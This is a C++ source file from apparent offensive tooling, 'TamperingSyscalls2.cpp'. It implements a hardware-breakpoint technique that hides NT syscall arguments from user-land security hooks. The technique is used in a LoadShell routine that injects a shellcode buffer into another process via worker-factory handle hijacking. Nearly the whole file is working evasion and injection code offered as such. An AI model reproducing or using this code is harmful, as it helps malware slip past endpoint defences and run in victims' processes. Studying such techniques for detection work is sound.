//////////////////////////////////////////////////////////////////////////////////////////
/*                           TamperingSyscalls2.cpp - @rad9800     c++20                */
/*              C++ Generic x64 user-land evasion technique utilizing HWBP.cpp          */
/*                   Hides up to 12 args of up to 4 NT calls per thread                 */
//////////////////////////////////////////////////////////////////////////////////////////
#include <windows.h>

#include <tlhelp32.h>
#include <functional>
#include <unordered_map>

#include "defs.h"
#include "injection.h"
#include "Utils.h"
#include "Process.h"
//////////////////////////////////////////////////////////////////////////////////////////
/*                                          Structs                                     */
//////////////////////////////////////////////////////////////////////////////////////////

						// 12 - 4 = 8 - should cover most Nt functions. 
#define STK_ARGS 8			// Increase this value, works until ~100...

typedef struct {
	uintptr_t									function_addr;	// +0x0
	uintptr_t									syscall_addr;	// +0x12
	UINT												 pos;
} ADDRESS_INFORMATION;

typedef struct {
	uintptr_t			Rcx;	// First
	uintptr_t			Rdx;	// Second
	uintptr_t			R8;		// Third
	uintptr_t			R9;		// Fourth
	uintptr_t			stk[STK_ARGS];	// Stack args
} FUNC_ARGS;

//////////////////////////////////////////////////////////////////////////////////////////
/*                                          Macros                                      */
////////////////////////////////////////////////////////////////////////////////////////// 
#define PRINT_ARGS( State, ExceptionInfo )                              \
printf("%s %d arguments and stack for 0x%p || TID : 0x%x\n",            \
    State, (STK_ARGS + 4), (PVOID)address, GetCurrentThreadId());       \
printf("1:\t0x%p\n", (PVOID)(ExceptionInfo)->ContextRecord->Rcx);       \
printf("2:\t0x%p\n", (PVOID)(ExceptionInfo)->ContextRecord->Rdx);       \
printf("3:\t0x%p\n", (PVOID)(ExceptionInfo)->ContextRecord->R8);        \
printf("4:\t0x%p\n", (PVOID)(ExceptionInfo)->ContextRecord->R9);        \
for (UINT idx = 0; idx < STK_ARGS; idx++){                              \
    const size_t offset = idx * 0x8 + 0x28;                             \
    printf("%d:\t0x%p\n", (idx + 5), (PVOID)*(PULONG64)                 \
        ((ExceptionInfo)->ContextRecord->Rsp + offset));                \
}

//////////////////////////////////////////////////////////////////////////////////////////
/*                                          Globals                                     */
//////////////////////////////////////////////////////////////////////////////////////////
std::unordered_map<uintptr_t, ADDRESS_INFORMATION> ADDRESS_MAP{ 0 };
// syscall opcode { 0x55 } address, func args in registers and stack 
std::unordered_map<uintptr_t, FUNC_ARGS> SYSCALL_MAP{ 0 };

//////////////////////////////////////////////////////////////////////////////////////////
/*                                      Functions                                       */
//////////////////////////////////////////////////////////////////////////////////////////
VOID SetHWBP(const HANDLE thd, const uintptr_t address, const UINT pos, const bool init)
{
	CONTEXT context;
	context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	GetThreadContext(thd, &context);

	if (init) {
		(&context.Dr0)[pos] = address;

		context.Dr7 &= ~(3ull << (16 + 4 * pos));
		context.Dr7 &= ~(3ull << (18 + 4 * pos));
		context.Dr7 |= 1ull << (2 * pos);
	}
	else {
		if ((&context.Dr0)[pos] == address) {
			context.Dr7 &= ~(1ull << (2 * pos));
			(&context.Dr0)[pos] = NULL;
		}
	}

	SetThreadContext(thd, &context);
}

// Find our ret ROP gadget (pointer decay so need explicit size)
uintptr_t FindRopAddress(const uintptr_t function, const BYTE* stub, const UINT size)
{
	for (unsigned int i = 0; i < (unsigned int)25; i++)
	{
		// memcmp WILL be optimized 
		if (memcmp((LPVOID)(function + i), stub, size) == 0) {
			return (function + i);
		}
	}
	return NULL;
}

DWORD WINAPI TestThread(LPVOID lpParameter);

//////////////////////////////////////////////////////////////////////////////////////////
/*                                        Classes                                       */
//////////////////////////////////////////////////////////////////////////////////////////
struct TS2_HWBP {
private:
	const uintptr_t address;
	UINT			pos;
public:
	TS2_HWBP(const uintptr_t address, const UINT idx) : address{ address },
		pos{ idx % 4 }
	{
		SetHWBP(GetCurrentThread(), address, pos, true);

		BYTE syscop[] = { 0x0F, 0x05 };
		ADDRESS_MAP[address].syscall_addr =
			FindRopAddress(address, syscop, sizeof(syscop));
		ADDRESS_MAP[address].function_addr = address;
		ADDRESS_MAP[address].pos = pos;
	};

	VOID RemoveHWBPS()
	{
		SetHWBP(GetCurrentThread(), address, pos, false);
	}

	~TS2_HWBP()
	{
		RemoveHWBPS();
	}
};

//////////////////////////////////////////////////////////////////////////////////////////
/*                                      Exception Handler                               */
//////////////////////////////////////////////////////////////////////////////////////////
LONG WINAPI ExceptionHandler(const PEXCEPTION_POINTERS ExceptionInfo)
{
	const auto address = ExceptionInfo->ContextRecord->Rip;
	printf("Exception: 0x%llx\n", address);
	printf("Exception Code: %d\n", ExceptionInfo->ExceptionRecord->ExceptionCode);
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
	{
		for (const auto& pair : ADDRESS_MAP)
		{
			const auto& k = pair.first;  // key
			const auto& v = pair.second; // value (ADDRESS_INFORMATION)

			if (address == v.function_addr) // mov r10, rcx
			{
				// Set Dr[pos] to address+0x12
				(&ExceptionInfo->ContextRecord->Dr0)[v.pos] = v.syscall_addr;

				const auto key = (address + 0x12) | GetCurrentThreadId();

				SYSCALL_MAP[key].Rcx = ExceptionInfo->ContextRecord->Rcx;
				SYSCALL_MAP[key].Rdx = ExceptionInfo->ContextRecord->Rdx;
				SYSCALL_MAP[key].R8 = ExceptionInfo->ContextRecord->R8;
				SYSCALL_MAP[key].R9 = ExceptionInfo->ContextRecord->R9;

				for (size_t idx = 0; idx < STK_ARGS; idx++)
				{
					const size_t offset = idx * 0x8 + 0x28;
					SYSCALL_MAP[key].stk[idx] =
						*(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset);
				}

				PRINT_ARGS("HIDING", ExceptionInfo);

				ExceptionInfo->ContextRecord->Rcx = 0;
				ExceptionInfo->ContextRecord->Rdx = 0;
				ExceptionInfo->ContextRecord->R8 = 0;
				ExceptionInfo->ContextRecord->R9 = 0;

				for (size_t idx = 0; idx < STK_ARGS; idx++)
				{
					const size_t offset = idx * 0x8 + 0x28;
					*(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset) = 0ull;
				}

				PRINT_ARGS("HIDDEN", ExceptionInfo);

				ExceptionInfo->ContextRecord->EFlags |= (1 << 16); // Resume Flag
				return EXCEPTION_CONTINUE_EXECUTION;
			}
			else if (address == v.syscall_addr)
			{
				// Set Dr[pos] to address-0x12
				(&ExceptionInfo->ContextRecord->Dr0)[v.pos] = v.function_addr;

				auto const key = (address | GetCurrentThreadId());

				// SSN in ExceptionInfo->ContextRecord->Rax

				// mov rcx, r10 
				ExceptionInfo->ContextRecord->R10 = SYSCALL_MAP[key].Rcx;
				ExceptionInfo->ContextRecord->Rcx = SYSCALL_MAP[key].Rcx;
				ExceptionInfo->ContextRecord->Rdx = SYSCALL_MAP[key].Rdx;
				ExceptionInfo->ContextRecord->R8 = SYSCALL_MAP[key].R8;
				ExceptionInfo->ContextRecord->R9 = SYSCALL_MAP[key].R9;

				for (size_t idx = 0; idx < STK_ARGS; idx++)
				{
					const size_t offset = idx * 0x8 + 0x28;
					*(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset) =
						SYSCALL_MAP[key].stk[idx];
				}

				PRINT_ARGS("RESTORED", ExceptionInfo);

				SYSCALL_MAP.erase(key);

				ExceptionInfo->ContextRecord->EFlags |= (1 << 16); // Resume Flag
				return EXCEPTION_CONTINUE_EXECUTION;
			}
		}
	}
	return EXCEPTION_CONTINUE_SEARCH;
}


int LoadShell(unsigned char* data, size_t dataSize, wchar_t* processName) {
	HandleHijackClass handleType = TpWorkerFactory;
	Process targetProcess(processName, handleType);
	if (!targetProcess.init()) {
		return EXIT_FAILURE;
	}

	const PVOID handler = AddVectoredExceptionHandler(1, ExceptionHandler);

	TS2_HWBP TS2NtWriteVirtualMemory{
		(uintptr_t)(GetProcAddress(GetModuleHandleW(L"NTDLL.dll"),
		"NtWriteVirtualMemory")),
		1
	};

	bool succeeded = false;
	succeeded = targetProcess.ProcessWorkerFactoryInject(data, dataSize);
	TS2NtWriteVirtualMemory.RemoveHWBPS();

	if (handler != nullptr) RemoveVectoredExceptionHandler(handler);

	VirtualFree(data, 0, MEM_RELEASE);

	if (!succeeded) {
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}